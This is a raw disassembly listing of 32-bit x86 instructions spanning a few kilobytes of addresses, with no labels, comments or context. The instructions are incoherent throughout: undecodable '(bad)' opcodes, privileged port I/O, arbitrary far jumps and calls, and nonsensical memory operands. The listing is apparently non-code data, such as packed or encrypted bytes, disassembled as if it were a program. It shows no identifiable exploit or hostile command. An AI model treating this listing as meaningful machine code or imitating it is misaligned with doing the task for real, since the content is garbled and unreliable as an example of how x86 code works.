  416e85:	inc    eax
  416e86:	mov    esp,0x52bb1b3b
  416e8b:	jno    0x416eb1
  416e8d:	popf   
  416e8e:	imul   esi,DWORD PTR [ebp-0x19d1e510],0xfff375c5
  416e98:	loopne 0x416ede
  416e9a:	mov    dh,0x1e
  416e9c:	xchg   ebp,ebp
  416e9e:	dec    edi
  416e9f:	mov    al,0x82
  416ea1:	xor    DWORD PTR [edi-0x74eaa827],ecx
  416ea7:	pop    ss
  416ea8:	pusha  
  416ea9:	call   0xcb0be785
  416eae:	sbb    ebx,DWORD PTR [edi-0x5a54fa7d]
  416eb4:	adc    DWORD PTR [esi],ebp
  416eb6:	outs   dx,DWORD PTR ds:[esi]
  416eb7:	dec    edi
  416eb8:	jle    0x416f0c
  416eba:	pop    edi
  416ebb:	jecxz  0x416f1c
  416ebd:	test   al,0xa9
  416ebf:	or     al,0x27
  416ec1:	ret    0x8b18
  416ec4:	arpl   WORD PTR [ecx-0x62bdc213],ax
  416eca:	hlt    
  416ecb:	retf   0x187d
  416ece:	mov    ecx,0x8bd35682
  416ed3:	push   es
  416ed4:	add    al,0xd5
  416ed6:	push   cs
  416ed7:	mov    ds:0xd43b6330,eax
  416edc:	inc    ebp
  416edd:	push   ebp
  416ede:	loopne 0x416f3f
  416ee0:	or     ch,BYTE PTR [ebx]
  416ee2:	scas   al,BYTE PTR es:[edi]
  416ee3:	mov    edi,0x3d967718
  416ee8:	xor    DWORD PTR [ebp+0x39928ae4],ecx
  416eee:	push   0xcfee8570
  416ef3:	cs call 0x78306c2a
  416ef9:	shl    dh,1
  416efb:	cmp    ebp,edi
  416efd:	mov    edi,0x7855faed
  416f02:	pushf  
  416f03:	repnz mov bh,0x82
  416f06:	mov    dl,0xd4
  416f08:	std    
  416f09:	fcmovnb st,st(6)
  416f0b:	xchg   esi,eax
  416f0c:	call   0x1fd64961
  416f11:	ja     0x416efb
  416f13:	sub    bh,BYTE PTR [ecx]
  416f15:	sbb    dl,0xf6
  416f18:	mov    BYTE PTR [edx+ebp*2-0x7be6ecfc],al
  416f1f:	sbb    BYTE PTR [ebp+0x73739b30],ah
  416f25:	adc    bh,BYTE PTR [esi+0x697e3f48]
  416f2b:	mov    bh,0xe7
  416f2d:	mov    dl,0x98
  416f2f:	mov    ds:0x268b4a3f,al
  416f34:	cld    
  416f35:	(bad)  
  416f37:	loopne 0x416f8e
  416f39:	cmp    ah,BYTE PTR [esi]
  416f3b:	jmp    0xc423:0xd5f08cb3
  416f42:	shl    BYTE PTR [ebp-0x26],1
  416f45:	fnsave [ebp+0x345bac17]
  416f4b:	mov    ebx,0x85ff75a7
  416f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f51:	dec    ebp
  416f52:	mov    cl,0xd6
  416f54:	sahf   
  416f55:	sar    BYTE PTR [ebp-0x43cf818d],cl
  416f5b:	pop    esi
  416f5c:	inc    ecx
  416f5d:	jo     0x416f5a
  416f5f:	cmp    al,0x3d
  416f61:	mov    ah,0x25
  416f63:	pop    eax
  416f64:	push   edi
  416f65:	pop    ds
  416f66:	mov    ecx,0xc915a109
  416f6b:	leave  
  416f6c:	xchg   ebp,eax
  416f6d:	das    
  416f6e:	retf   0xc537
  416f71:	ja     0x416f87
  416f73:	adc    eax,0x7716130a
  416f78:	inc    eax
  416f79:	adc    cl,dl
  416f7b:	in     al,0xcc
  416f7d:	lods   al,BYTE PTR ds:[esi]
  416f7e:	xlat   BYTE PTR ds:[ebx]
  416f7f:	lock or edx,DWORD PTR [esi+0x20]
  416f83:	leave  
  416f84:	(bad)  
  416f85:	fcmovnu st,st(2)
  416f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f88:	scas   eax,DWORD PTR es:[edi]
  416f89:	dec    DWORD PTR [edi]
  416f8b:	mov    bl,0x75
  416f8d:	clc    
  416f8e:	in     al,0x2e
  416f90:	mov    edi,0x215d8aa9
  416f95:	add    BYTE PTR [esi],ch
  416f97:	aaa    
  416f98:	add    BYTE PTR [ecx+0x671909fa],al
  416f9e:	scas   eax,DWORD PTR es:[edi]
  416f9f:	push   cs
  416fa0:	loope  0x416ff4
  416fa2:	xor    bl,BYTE PTR [eax+0x60]
  416fa5:	and    BYTE PTR [edx],cl
  416fa7:	mov    al,0x40
  416fa9:	adc    al,0x52
  416fab:	(bad)  
  416fac:	std    
  416fad:	pop    edx
  416fae:	push   esi
  416faf:	mov    esi,0xa0dff81d
  416fb4:	daa    
  416fb5:	pop    ebx
  416fb6:	jo     0x416f50
  416fb8:	sub    DWORD PTR [edi+0x4d],ebx
  416fbb:	aaa    
  416fbc:	shr    DWORD PTR [eax],0x5f
  416fbf:	out    dx,al
  416fc0:	pop    ebx
  416fc1:	hlt    
  416fc2:	add    DWORD PTR [ebx],eax
  416fc4:	call   0x5db2e646
  416fc9:	dec    esi
  416fca:	and    eax,0xcda93a46
  416fcf:	adc    bl,dl
  416fd1:	push   ebp
  416fd2:	push   ds
  416fd3:	jno    0x416f69
  416fd5:	fist   DWORD PTR [ebp-0x11]
  416fd8:	cmp    ch,bl
  416fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fdb:	dec    ecx
  416fdc:	mov    al,ds:0x92018b49
  416fe1:	sub    DWORD PTR [edx-0x64],0x3736e723
  416fe8:	(bad)  
  416fe9:	mov    edi,0xfe932fe3
  416fee:	inc    DWORD PTR [ebx]
  416ff0:	ja     0x417005
  416ff2:	pop    eax
  416ff3:	and    BYTE PTR [ebp-0x3db8d3c4],bh
  416ff9:	popf   
  416ffa:	loope  0x416fdd
  416ffc:	mov    ah,0x99
  416ffe:	mov    eax,0xfec0f14f
  417003:	xor    cl,bl
  417005:	lds    ecx,FWORD PTR [edi-0x75]
  417008:	sbb    bl,ch
  41700a:	(bad)
  41700d:	mov    ecx,0x6d2c534e
  417012:	fdiv   DWORD PTR [edi+0x5fb2469]
  417018:	jbe    0x416fed
  41701a:	cmp    BYTE PTR [eax-0x6f],cl
  41701d:	adc    al,0xfc
  41701f:	inc    edx
  417020:	mov    DWORD PTR [ebx-0x15e71634],esp
  417026:	clc    
  417027:	das    
  417028:	xchg   DWORD PTR [esi-0x55],esp
  41702b:	xchg   BYTE PTR [edi],bh
  41702d:	xchg   BYTE PTR [esi],cl
  41702f:	and    ecx,esi
  417031:	cs mov eax,0x30cdf242
  417037:	inc    esi
  417038:	mov    edi,esi
  41703a:	jp     0x41705c
  41703c:	jbe    0x416fe0
  41703e:	push   cs
  41703f:	test   BYTE PTR [eax-0x9],0xe6
  417043:	sub    ebp,esp
  417045:	int    0x49
  417047:	add    eax,0x781d300f
  41704c:	xchg   ebx,eax
  41704d:	adc    BYTE PTR [edx-0x5b33ca79],al
  417053:	lock xchg esi,eax
  417055:	test   al,0x16
  417057:	and    al,0x8f
  417059:	push   ebp
  41705a:	ins    BYTE PTR es:[edi],dx
  41705b:	sbb    eax,0x5fba497f
  417060:	pop    esi
  417061:	sub    ebx,DWORD PTR [ecx-0x69]
  417064:	cmp    ecx,eax
  417066:	adc    al,0xf5
  417068:	fs test ebx,ebx
  41706b:	ins    DWORD PTR es:[edi],dx
  41706c:	stos   BYTE PTR es:[edi],al
  41706d:	or     al,0x16
  41706f:	test   eax,0xec2e0623
  417074:	in     eax,dx
  417075:	xchg   esp,eax
  417076:	ins    DWORD PTR es:[edi],dx
  417077:	out    0x6,al
  417079:	mov    esp,DWORD PTR [eax+0x3aa2cda2]
  41707f:	mov    esi,0xb187f6bb
  417084:	and    dh,0xce
  417087:	dec    eax
  417088:	xchg   ebx,ebx
  41708a:	sub    ebx,DWORD PTR [edx+0x65fa8304]
  417090:	mov    ah,0xf0
  417092:	neg    BYTE PTR [ecx+0x5f77dbf]
  417098:	ds daa 
  41709a:	dec    edi
  41709b:	retf   
  41709c:	xchg   edx,eax
  41709d:	(bad)  
  41709e:	push   edx
  41709f:	xlat   BYTE PTR ds:[ebx]
  4170a0:	les    ecx,FWORD PTR [eax]
  4170a2:	inc    edx
  4170a3:	push   esi
  4170a4:	fwait
  4170a5:	test   DWORD PTR [ebx+0x1b],edi
  4170a8:	push   esp
  4170a9:	into   
  4170aa:	or     DWORD PTR [edi],ecx
  4170ac:	mov    ebp,0x70863efc
  4170b1:	push   es
  4170b2:	loopne 0x41709e
  4170b4:	ins    DWORD PTR es:[edi],dx
  4170b5:	fstp   DWORD PTR [edx+0x43]
  4170b8:	fisubr WORD PTR [eax+0x42]
  4170bb:	dec    DWORD PTR [ebp+0x3]
  4170be:	or     ax,0xd61
  4170c2:	sbb    eax,0x1d6b9b48
  4170c7:	inc    esp
  4170c8:	nop
  4170c9:	out    0xe9,eax
  4170cb:	pop    ds
  4170cc:	jge    0x4170ce
  4170ce:	clc    
  4170cf:	mov    bh,0x36
  4170d1:	xchg   ebp,eax
  4170d2:	xchg   ebx,eax
  4170d3:	inc    ebp
  4170d4:	dec    eax
  4170d5:	fs das 
  4170d7:	sub    DWORD PTR [esi+0x14f0dd1c],0x6e
  4170de:	jb     0x417063
  4170e0:	fsubr  st,st(5)
  4170e2:	pop    edi
  4170e3:	int    0xa3
  4170e5:	mov    bl,0x9c
  4170e7:	inc    edi
  4170e8:	jmp    0xec6c:0xf5986930
  4170ef:	daa    
  4170f0:	xchg   esi,eax
  4170f1:	into   
  4170f2:	mov    cl,0xd3
  4170f4:	ins    BYTE PTR es:[edi],dx
  4170f5:	pop    ds
  4170f6:	jecxz  0x417169
  4170f8:	dec    ebp
  4170f9:	and    bh,BYTE PTR [ecx+0x5b]
  4170fc:	imul   edx,DWORD PTR [edx+0x7046c5ae],0xffffff99
  417103:	mov    edi,DWORD PTR [esi]
  417105:	and    al,0xbd
  417107:	popa   
  417108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417109:	pop    edx
  41710a:	xlat   BYTE PTR ds:[ebx]
  41710b:	mov    al,0xba
  41710d:	ror    bh,1
  41710f:	int    0x37
  417111:	aaa    
  417112:	mov    edi,0x88b14151
  417117:	cmp    cl,bl
  417119:	retf   
  41711a:	and    DWORD PTR [ecx+ebx*2-0x4f],esi
  41711e:	adc    eax,0xb3de2e33
  417123:	inc    ebx
  417124:	jno    0x41715e
  417126:	add    eax,0xced08bc6
  41712b:	xor    dl,al
  41712d:	popa   
  41712e:	cli    
  41712f:	mov    ds:0xc71e8d3f,al
  417134:	clc    
  417135:	xchg   DWORD PTR [eax+0x35],edi
  417138:	mov    ecx,0x74f06a1f
  41713d:	scas   eax,DWORD PTR es:[edi]
  41713e:	mov    WORD PTR [ebx],cs
  417140:	dec    ebp
  417141:	sbb    ch,cl
  417143:	xchg   BYTE PTR [edx+0xc33741d],dl
  417149:	push   es
  41714a:	jnp    0x4170e7
  41714c:	iret   
  41714d:	addr16 pusha 
  41714f:	mov    esi,0x390c6161
  417154:	xchg   ecx,eax
  417155:	stos   DWORD PTR es:[edi],eax
  417156:	sub    DWORD PTR [ebp+0x19],ecx
  417159:	cmp    ebx,DWORD PTR [ebx-0x33]
  41715c:	scas   al,BYTE PTR es:[edi]
  41715d:	adc    ecx,ecx
  41715f:	imul   DWORD PTR es:[edx]
  417162:	faddp  st(2),st
  417164:	fimul  WORD PTR [ebp+0x6dace2b3]
  41716a:	jae    0x4171a2
  41716c:	mov    eax,ss:0x23254361
  417172:	cmc    
  417173:	mov    ecx,0xd6c299f0
  417178:	mov    cl,0xb4
  41717a:	jne    0x417116
  41717c:	inc    edx
  41717d:	mov    ebx,edx
  41717f:	add    BYTE PTR [ebx],al
  417181:	xchg   ebx,eax
  417182:	mov    ebx,0x16fc8169
  417187:	lods   eax,DWORD PTR es:[esi]
  417189:	jge    0x41712c
  41718b:	cwde   
  41718c:	xchg   ecx,eax
  41718d:	sahf   
  41718e:	lods   al,BYTE PTR ds:[esi]
  41718f:	scas   ax,WORD PTR es:[edi]
  417191:	arpl   WORD PTR [eax-0x4b3e2c0d],cx
  417197:	stos   DWORD PTR es:[edi],eax
  417198:	sub    BYTE PTR [esp+eax*8],ah
  41719b:	jecxz  0x417149
  41719d:	rcl    BYTE PTR [ebx],1
  41719f:	add    eax,0x41220dca
  4171a4:	jo     0x4171fd
  4171a6:	jb     0x4171a4
  4171a8:	jecxz  0x41721d
  4171aa:	pop    eax
  4171ab:	jae    0x417192
  4171ad:	xor    al,0xbe
  4171af:	xor    DWORD PTR [ecx+0x670c89b0],ebx
  4171b5:	adc    eax,0x7b38c04f
  4171ba:	pop    ebx
  4171bb:	pop    ebx
  4171bc:	sub    eax,0x68859d01
  4171c1:	mov    ecx,0x487d3bb9
  4171c6:	sahf   
  4171c7:	jecxz  0x417238
  4171c9:	cmp    edx,edx
  4171cb:	push   ebp
  4171cc:	sub    BYTE PTR [ecx],ch
  4171ce:	pop    es
  4171cf:	push   edx
  4171d0:	pop    ds
  4171d1:	(bad)  [ebp+edi*8-0x46]
  4171d5:	mov    ebp,0xfacde464
  4171da:	sub    BYTE PTR [edx+0x63d63bbf],ch
  4171e0:	fld    QWORD PTR [esi-0x263b89d3]
  4171e6:	push   eax
  4171e7:	inc    ebx
  4171e8:	jne    0x41725d
  4171ea:	sub    eax,0xd26ceacb
  4171ef:	out    0xb9,eax
  4171f1:	ss xchg edi,eax
  4171f3:	outs   dx,DWORD PTR ds:[esi]
  4171f4:	sbb    ebp,DWORD PTR [ecx-0x52]
  4171f7:	and    cl,dl
  4171f9:	mov    al,0x88
  4171fb:	stc    
  4171fc:	cdq    
  4171fd:	jne    0x41719b
  4171ff:	sub    DWORD PTR [esi+0x24],edx
  417202:	outs   dx,BYTE PTR ds:[esi]
  417203:	in     al,dx
  417204:	mov    edi,0x9b9abc2e
  417209:	adc    ah,BYTE PTR [ecx+0x60]
  41720c:	leave  
  41720d:	pop    ss
  41720e:	loope  0x4171b5
  417210:	pop    ebx
  417211:	mov    cs,WORD PTR [ecx-0x10]
  417214:	mov    ds:0x577d2490,eax
  417219:	test   BYTE PTR [ebx],bl
  41721b:	push   cs
  41721c:	mov    bh,0x1f
  41721e:	js     0x41729d
  417220:	mov    DWORD PTR [ebx-0x27],eax
  417223:	mov    ds:0x31a2a31e,eax
  417228:	stc    
  417229:	push   eax
  41722a:	xor    BYTE PTR [ebx+0x29],ah
  41722d:	loop   0x417249
  41722f:	sti    
  417230:	test   al,0xad
  417232:	int    0x8e
  417234:	out    dx,eax
  417235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417236:	gs inc ebx
  417238:	in     eax,dx
  417239:	cdq    
  41723a:	dec    eax
  41723b:	inc    edx
  41723c:	xchg   edx,eax
  41723d:	push   ds
  41723e:	pusha  
  41723f:	jecxz  0x4171fe
  417241:	sbb    al,0xbb
  417243:	repnz sub eax,0xf52b4e4e
  417249:	loope  0x41726e
  41724b:	inc    ebp
  41724c:	mov    BYTE PTR [esi+0x43],dh
  41724f:	clc    
  417250:	iret   
  417251:	push   edx
  417252:	pop    ss
  417253:	leave  
  417254:	shl    DWORD PTR [ebx+eax*4+0x5f03df8f],0x49
  41725c:	jl     0x4172b4
  41725e:	fsub   QWORD PTR [edx-0x289b8f93]
  417264:	aam    0xe0
  417266:	arpl   dx,cx
  417268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417269:	in     eax,dx
  41726a:	mov    edi,DWORD PTR [ecx+0x6b]
  41726d:	nop
  41726e:	dec    eax
  41726f:	dec    esi
  417270:	cmc    
  417271:	sbb    eax,0x827faa0d
  417276:	push   es
  417277:	mov    eax,0x9676fc20
  41727c:	(bad)  
  41727d:	mov    WORD PTR [ecx+edx*1-0x3f],?
  417281:	js     0x417285
  417283:	loope  0x4172e6
  417285:	pop    ss
  417286:	sbb    eax,DWORD PTR [edx]
  417288:	jl     0x417229
  41728a:	inc    ebx
  41728b:	sub    al,0x90
  41728d:	test   BYTE PTR [ecx+0x67e2caac],al
  417293:	std    
  417294:	mov    edx,0x5f4b487
  417299:	ret    
  41729a:	adc    esi,ebp
  41729c:	push   ss
  41729d:	xor    al,0xce
  41729f:	mov    bl,0xab
  4172a1:	push   ds
  4172a2:	adc    eax,edi
  4172a4:	xor    bl,BYTE PTR [ebx+0x3d1d973]
  4172aa:	xchg   ecx,eax
  4172ab:	lahf   
  4172ac:	mov    ds:0xa2def3d6,al
  4172b1:	mov    al,0x6b
  4172b3:	push   0x1d2960c1
  4172b8:	icebp  
  4172b9:	sbb    al,0xf8
  4172bb:	push   ebp
  4172bc:	push   0xffffffb9
  4172be:	mul    BYTE PTR [edi+ebp*2-0x3e]
  4172c2:	adc    esp,esi
  4172c4:	int    0x83
  4172c6:	cmp    eax,0xaf6ecb3e
  4172cb:	pusha  
  4172cc:	loopne 0x417289
  4172ce:	shr    ecx,0xf7
  4172d1:	aad    0xc4
  4172d3:	push   cs
  4172d4:	sub    BYTE PTR [edi+0x11],ah
  4172d7:	mov    al,0x49
  4172d9:	out    dx,al
  4172da:	mov    ecx,0x39825a34
  4172df:	xor    BYTE PTR [edx+0x3b],0xce
  4172e3:	repz push es
  4172e5:	dec    eax
  4172e6:	das    
  4172e7:	jge    0x41732c
  4172e9:	mov    DWORD PTR [ecx],ebx
  4172eb:	push   cs
  4172ec:	mov    ds:0xa97f2c20,al
  4172f1:	call   0x2fee:0xa2804138
  4172f8:	(bad)  
  4172f9:	pop    edi
  4172fa:	mov    BYTE PTR [edx-0x57163ec0],0x26
  417301:	push   eax
  417302:	repnz inc esp
  417304:	or     eax,0x5504da08
  417309:	std    
  41730a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41730b:	dec    eax
  41730c:	icebp  
  41730d:	mov    eax,ds:0x6cc60dba
  417312:	jns    0x4172a0
  417314:	les    ebp,FWORD PTR [ecx+0x49]
  417317:	add    ah,bl
  417319:	push   0xfffffff7
  41731b:	pop    es
  41731c:	je     0x41735c
  41731e:	lea    edx,[edi-0x3e]
  417321:	enter  0x7174,0x79
  417325:	inc    ecx
  417326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417327:	lock push ebx
  417329:	inc    ebx
  41732b:	dec    esi
  41732c:	dec    ebx
  41732d:	push   edx
  41732e:	jo     0x41739e
  417330:	pop    ecx
  417331:	and    esp,edx
  417333:	mov    edi,0xcd2a4ac3
  417338:	ins    BYTE PTR es:[edi],dx
  417339:	into   
  41733a:	mov    ch,0x2d
  41733c:	add    ecx,DWORD PTR [eax-0x39]
  41733f:	pop    ss
  417340:	ror    DWORD PTR [esi+0x41],0x53
  417344:	and    ebp,DWORD PTR [edi-0x252d23bf]
  41734a:	fldcw  WORD PTR [ebx]
  41734c:	loope  0x417396
  41734e:	and    eax,0x8de918f5
  417353:	xor    al,0xd6
  417355:	jge    0x417385
  417357:	cmp    dh,BYTE PTR [edx+0x5a]
  41735a:	xchg   esi,eax
  41735b:	mov    eax,0x238fc769
  417360:	dec    ebp
  417361:	or     al,0xce
  417363:	push   esp
  417364:	(bad)  
  417365:	fcmovb st,st(3)
  417367:	cli    
  417368:	fadd   QWORD PTR [edi+ebx*1-0x5f2a671b]
  41736f:	loop   0x4173b4
  417371:	adc    ah,cl
  417373:	push   eax
  417374:	test   al,0xbd
  417376:	(bad)  
  417377:	cmp    eax,0x37f7f011
  41737c:	lods   eax,DWORD PTR ds:[esi]
  41737d:	data16 in al,0xd8
  417380:	fnstenv [ebx+0x54934b0d]
  417386:	jecxz  0x417375
  417388:	dec    edi
  417389:	gs test eax,0x104f7f1c
  41738f:	xchg   ecx,eax
  417390:	fisttp QWORD PTR [eax+eax*2]
  417393:	sti    
  417394:	dec    ecx
  417395:	dec    edi
  417396:	ja     0x41737b
  417398:	push   edi
  417399:	std    
  41739a:	mov    ds:0x735370fd,al
  41739f:	fcomp  QWORD PTR [eax-0x7a]
  4173a2:	in     eax,dx
  4173a3:	mov    esi,0x19606e2a
  4173a8:	ret    
  4173a9:	je     0x41733f
  4173ab:	pop    edx
  4173ac:	pop    esi
  4173ad:	sub    DWORD PTR [ebp-0x19],0xffffffa7
  4173b1:	(bad)  
  4173b2:	je     0x41742c
  4173b4:	xchg   al,cl
  4173b6:	xchg   ebp,eax
  4173b7:	pusha  
  4173b8:	out    dx,eax
  4173b9:	pop    ds
  4173ba:	icebp  
  4173bb:	and    al,0x76
  4173bd:	cs stc 
  4173bf:	mov    eax,0x3d8ae101
  4173c4:	cmp    eax,0x1fbd0e5c
  4173c9:	mov    WORD PTR [ecx],gs
  4173cb:	pop    ebx
  4173cc:	add    ebx,DWORD PTR [ebx-0x2f]
  4173cf:	pop    edi
  4173d0:	shl    DWORD PTR fs:[esi+0x4a],cl
  4173d4:	loope  0x417400
  4173d6:	or     ebp,DWORD PTR [eax-0x58630f37]
  4173dc:	jecxz  0x4173bc
  4173de:	sbb    al,0x2d
  4173e0:	sbb    al,0x5b
  4173e2:	push   esi
  4173e3:	bound  ecx,QWORD PTR [ebp-0x56cbe4fd]
  4173e9:	sbb    ebp,DWORD PTR [ebp+0x6f8ebe2d]
  4173ef:	fisttp DWORD PTR [ebx]
  4173f1:	aam    0x6f
  4173f3:	cdq    
  4173f4:	dec    ah
  4173f6:	stos   BYTE PTR es:[edi],al
  4173f7:	dec    edx
  4173f8:	inc    eax
  4173f9:	mov    ebx,DWORD PTR [eax+edi*4]
  4173fc:	fnstenv [ebp+0x147e3222]
  417402:	adc    dh,BYTE PTR [edi-0x447ceb08]
  417408:	arpl   WORD PTR [ebp+edx*1+0x76],si
  41740c:	out    0x7d,eax
  41740e:	or     dl,BYTE PTR [ebp+0x5e257f5c]
  417414:	loope  0x41748a
  417416:	sub    dh,BYTE PTR [ebp-0x4d7c40da]
  41741c:	inc    edx
  41741d:	push   ss
  41741e:	dec    ecx
  41741f:	popa   
  417420:	dec    ebx
  417421:	ret    
  417422:	xchg   ebp,eax
  417423:	out    0xfc,eax
  417425:	pop    edx
  417426:	sub    al,0xfc
  417428:	jle    0x417408
  41742a:	imul   edi,DWORD PTR [ecx-0x53],0x3c25026f
  417431:	xor    al,0xd5
  417433:	cmp    cl,BYTE PTR ds:0xfb7d857
  417439:	shr    BYTE PTR [ecx+0x240ac98c],0x92
  417440:	mov    ds:0x22028538,al
  417445:	popf   
  417446:	cmc    
  417447:	outs   dx,BYTE PTR ds:[esi]
  417448:	pop    edi
  417449:	retf   0x125d
  41744c:	retf   0x4209
  41744f:	jle    0x417460
  417451:	xor    ah,dh
  417453:	adc    BYTE PTR [edx-0x6d],ah
  417456:	xor    al,0x86
  417458:	jns    0x417425
  41745a:	sbb    BYTE PTR [edx],0x5a
  41745d:	cmp    DWORD PTR [esi],edx
  41745f:	jnp    0x41748a
  417461:	dec    esp
  417462:	cmp    ecx,0xeb18e237
  417468:	sbb    BYTE PTR [ebp+0xc],ah
  41746b:	mov    bh,0x7b
  41746d:	loop   0x4174e5
  41746f:	cmp    eax,0x6719ca93
  417474:	dec    eax
  417475:	sbb    BYTE PTR [esi+0x168247fd],0x61
  41747c:	xchg   esi,eax
  41747d:	stos   DWORD PTR es:[edi],eax
  41747e:	push   eax
  41747f:	or     ebx,ebp
  417481:	sbb    BYTE PTR [edi],dh
  417483:	and    al,0x4a
  417485:	(bad)  [edi-0x75]
  417488:	adc    DWORD PTR [eax],esi
  41748a:	mov    ds:0xfa91e2f7,eax
  41748f:	sbb    ebx,DWORD PTR [ebp+eiz*2-0x10c2eb88]
  417496:	cmc    
  417497:	xchg   esi,eax
  417498:	pop    ecx
  417499:	loopne 0x4174e4
  41749b:	add    DWORD PTR [edi],eax
  41749d:	mov    ds:0x9c64b3ae,eax
  4174a2:	mov    esp,0x644a13ab
  4174a7:	push   es
  4174a8:	inc    ebp
  4174a9:	ror    BYTE PTR [eax],cl
  4174ab:	shl    DWORD PTR [edx-0x100c63a9],0x90
  4174b2:	sub    bh,bh
  4174b4:	jecxz  0x4174ba
  4174b6:	adc    DWORD PTR [ebp+0x1d3e61fa],ecx
  4174bc:	mov    dl,BYTE PTR [edi*1-0x2f53a92a]
  4174c3:	outs   dx,BYTE PTR ds:[esi]
  4174c4:	(bad)  
  4174c5:	aam    0x9
  4174c7:	inc    eax
  4174c8:	les    edx,FWORD PTR [eax]
  4174ca:	in     al,dx
  4174cb:	mov    eax,0x234d316
  4174d0:	mov    BYTE PTR ds:0x2bd70fee,ah
  4174d6:	pusha  
  4174d7:	scas   al,BYTE PTR es:[edi]
  4174d8:	xor    ah,BYTE PTR [ecx]
  4174da:	fild   DWORD PTR [eax]
  4174dc:	pop    esi
  4174dd:	sbb    al,0xee
  4174df:	ja     0x4174ed
  4174e1:	out    0xee,al
  4174e3:	pop    ecx
  4174e4:	or     DWORD PTR [ecx-0x64],ecx
  4174e7:	rcr    BYTE PTR [ebp+0x67],0x7
  4174eb:	cmove  esp,DWORD PTR ds:0x164b58f
  4174f2:	xor    al,0x20
  4174f4:	inc    ebx
  4174f5:	sbb    DWORD PTR [ebp-0x1950165e],esi
  4174fb:	fpatan 
  4174fd:	sti    
  4174fe:	imul   edx,DWORD PTR [edx+0x1f],0xf9a238e
  417505:	xchg   esp,eax
  417506:	pop    esp
  417507:	fimul  WORD PTR [edi+0x7]
  41750a:	mov    edi,fs
  41750c:	test   DWORD PTR [ebx+0x7423223c],ecx
  417512:	mov    ds:0xd48c70a0,eax
  417517:	mov    bh,0xd7
  417519:	lods   eax,DWORD PTR ds:[esi]
  41751a:	sub    dl,BYTE PTR [ebp+0x43c1be73]
  417520:	nop
  417521:	dec    esp
  417522:	imul   ebp,DWORD PTR [ebx-0x5e],0x19
  417526:	in     al,dx
  417527:	stc    
  417528:	out    0xc5,eax
  41752a:	in     eax,dx
  41752b:	adc    al,0xbb
  41752d:	mov    edx,0xf8002649
  417532:	xlat   BYTE PTR ds:[ebx]
  417533:	test   DWORD PTR fs:[ebx-0x6c],ebx
  417537:	sbb    BYTE PTR [ebp-0x6b016f56],cl
  41753d:	push   esi
  41753e:	fld    DWORD PTR [edx+0x21c1e92e]
  417544:	dec    esi
  417546:	jnp    0x417592
  417548:	(bad)  
  417549:	pop    ebp
  41754a:	mov    ecx,0x424369c2
  41754f:	mov    edx,0x563a2367
  417554:	push   esp
  417555:	loopne 0x41757e
  417557:	imul   edx,DWORD PTR [ebp+0x6a818c89],0x4b
  41755e:	mov    ds:0xf5f7cdde,al
  417563:	arpl   WORD PTR [ebp-0x4a],si
  417566:	mov    ebp,DWORD PTR [esi+0x4a]
  417569:	cmc    
  41756a:	lock jb 0x41757f
  41756d:	loopne 0x4175d9
  41756f:	and    BYTE PTR [edx+edx*2-0x5f],cl
  417573:	push   0x21
  417575:	push   0x5d
  417577:	xacquire xchg DWORD PTR ds:0x4dcb9a3,edx
  41757e:	mov    dl,0x40
  417580:	fsub   QWORD PTR [edi+0x56]
  417583:	neg    DWORD PTR [ecx-0x24]
  417586:	aam    0xe3
  417588:	mov    cl,0xd9
  41758a:	repz push es
  41758c:	cli    
  41758d:	pop    eax
  41758e:	ins    BYTE PTR es:[edi],dx
  41758f:	std    
  417590:	scas   al,BYTE PTR es:[edi]
  417591:	sub    bh,0xd3
  417594:	adc    dh,bl
  417596:	lahf   
  417597:	int3   
  417598:	repnz xchg edi,eax
  41759a:	push   DWORD PTR [esi+edx*4+0x6cb20af0]
  4175a1:	mov    ebx,gs
  4175a3:	xchg   ebx,eax
  4175a4:	mov    eax,DWORD PTR [ebx+0x15]
  4175a7:	aad    0x29
  4175a9:	mov    eax,0x971ed38f
  4175ae:	dec    ecx
  4175af:	xchg   esp,eax
  4175b0:	fistp  WORD PTR fs:[ecx]
  4175b3:	cmp    eax,0xcf1bdde6
  4175b8:	fcom   DWORD PTR [edi]
  4175ba:	inc    esp
  4175bb:	std    
  4175bc:	loop   0x41761c
  4175be:	sahf   
  4175bf:	pop    ds
  4175c0:	mov    al,0x2f
  4175c2:	fdiv   DWORD PTR [esi]
  4175c4:	adc    bh,BYTE PTR [esi+0x6d4d61fe]
  4175ca:	out    0xd6,al
  4175cc:	xchg   ecx,eax
  4175cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ce:	jb     0x417631
  4175d0:	cmp    DWORD PTR [esp+eax*4],edi
  4175d3:	dec    edx
  4175d4:	je     0x41760e
  4175d6:	or     edx,edx
  4175d8:	(bad)  
  4175d9:	ss push cs
  4175db:	mov    ds:0x39c6656e,al
  4175e0:	cwde   
  4175e1:	into   
  4175e2:	jl     0x417594
  4175e4:	das    
  4175e5:	push   esp
  4175e6:	inc    ebx
  4175e7:	lea    ebp,[edx+0x76]
  4175ea:	xchg   edi,eax
  4175eb:	sbb    edx,DWORD PTR [ecx]
  4175ed:	push   esi
  4175ee:	add    bl,ah
  4175f0:	mov    ds:0xd33cdd79,al
  4175f5:	(bad)  
  4175f6:	and    al,0x93
  4175f8:	jmp    0xfa8:0x54ae79ce
  4175ff:	test   BYTE PTR [eax-0x7a27e9d3],bl
  417605:	mov    ds:0xde693170,al
  41760a:	mov    ebp,0xf434ff78
  41760f:	pop    edi
  417610:	mov    ebp,0x4e8934ee
  417615:	mov    ebp,DWORD PTR [ecx]
  417617:	add    esp,eax
  417619:	outs   dx,DWORD PTR ds:[esi]
  41761a:	mov    ds:0x10ded84b,eax
  41761f:	iret   
  417620:	in     eax,dx
  417621:	(bad)  
  417622:	mov    ebx,0x8b2a2cfd
  417627:	adc    eax,0xbb9a5033
  41762c:	dec    esi
  41762d:	enter  0x7d57,0x3b
  417631:	or     DWORD PTR [edi+0x4a],0x63a8cdaa
  417638:	jmp    0x5f48:0x5f4b4d65
  41763f:	push   esi
  417640:	fs xchg ebx,eax
  417642:	int3   
  417643:	sub    eax,0xb48586c1
  417648:	fs dec esp
  41764a:	std    
  41764b:	pop    esp
  41764c:	push   edx
  41764d:	mov    edx,DWORD PTR [edi+0x18]
